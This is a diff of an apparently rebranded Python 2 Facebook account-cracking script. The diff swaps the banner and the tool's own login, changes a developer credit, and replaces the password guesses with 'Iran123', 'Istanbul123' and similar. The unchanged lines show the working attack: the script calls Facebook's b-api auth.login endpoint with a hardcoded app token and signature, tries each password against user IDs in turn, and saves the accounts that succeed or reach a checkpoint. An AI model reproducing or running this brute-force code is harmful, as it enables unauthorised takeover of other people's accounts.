@@ -81,17 +81,15 @@ print  """
 \033[1;97m************************************************
 
  
-\033[1;91m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╱╭━━━━╮
-\033[1;91m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱╱┃╭╮╭╮┃
-\033[1;91m╰╮╰╯╭┻━┳╮╭┳━╮╭━━╮╱╰╯┃┃┣╋━━┳━━┳━╮
-\033[1;91m╱╰╮╭┫╭╮┃┃┃┃╭╮┫╭╮┣━━╮┃┃┣┫╭╮┃┃━┫╭╯
-\033[1;91m╱╱┃┃┃╰╯┃╰╯┃┃┃┃╰╯┣━━╯┃┃┃┃╰╯┃┃━┫┃
-\033[1;91m╱╱╰╯╰━━┻━━┻╯╰┻━╮┃╱╱╱╰╯╰┻━╮┣━━┻╯
-\033[1;91m╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃╱╱╱╱╱╱╭━╯┃
-╱╱╱╱╱╱\033[1;91m╱╱╱╱╱╱╱╰━━╯╱╱╱╱╱╱╰━━╯
+\033[1;91m╭━━╮╱╱╱╱╱╱╱╱╱╱╭━━━╮╭╮╱╭╮╱╱╱╱╱╱╭╮
+\033[1;92m╰┫┣╯╱╱╱╱╱╱╱╱╱╱┃╭━╮┣╯╰┳╯╰╮╱╱╱╱╱┃┃
+\033[1;93m╱┃┃╭━┳━━┳━╮╱╱╱┃┃╱┃┣╮╭┻╮╭╋━━┳━━┫┃╭╮
+\033[1;94m╱┃┃┃╭┫╭╮┃╭╮┳━━┫╰━╯┃┃┃╱┃┃┃╭╮┃╭━┫╰╯╯
+\033[1;95m╭┫┣┫┃┃╭╮┃┃┃┣━━┫╭━╮┃┃╰╮┃╰┫╭╮┃╰━┫╭╮╮
+\033[1;96m╰━━┻╯╰╯╰┻╯╰╯╱╱╰╯╱╰╯╰━╯╰━┻╯╰┻━━┻╯╰╯
 """
 
-CorrectUsername = "YoungTiger"
+CorrectUsername = "Iran"
 CorrectPassword = "Arbab"
 loop = 'true'
 while (loop == 'true'):
@@ -299,7 +297,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:rana
+			pass #Dev:Arbab
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
@@ -347,7 +345,7 @@ def pilih_super():
 				               cek.close()
 				               cekpoint.append(user+pass2)								
 				           else:											
-					       pass3 = '786000'									
+					       pass3 = 'Iran123'									
 					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
 					       q = json.load(data)										
 					       if 'access_token' in q:	
@@ -369,7 +367,7 @@ def pilih_super():
 				                           cek.close()
 				                           cekpoint.append(user+pass3)									
 					               else:										
-						           pass4 = '000786'										
+						           pass4 = 'Iran1234'										
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                   q = json.load(data)												
 			                                   if 'access_token' in q:		
@@ -391,7 +389,7 @@ def pilih_super():
 				                                       cek.close()
 				                                       cekpoint.append(user+pass4)					
 					                           else:									
-						                       pass5 = '786786'							
+						                       pass5 = 'Iran12345'							
 						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
 						                       q = json.load(data)								
 						                       if 'access_token' in q:	
@@ -413,7 +411,7 @@ def pilih_super():
 				                                                   cek.close()
 				                                                   cekpoint.append(user+pass5)					
 						                               else:								
-							                           pass6 = 'Pakistan'											
+							                           pass6 = 'Istanbul123'											
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                           q = json.load(data)												
 			                                                           if 'access_token' in q:	
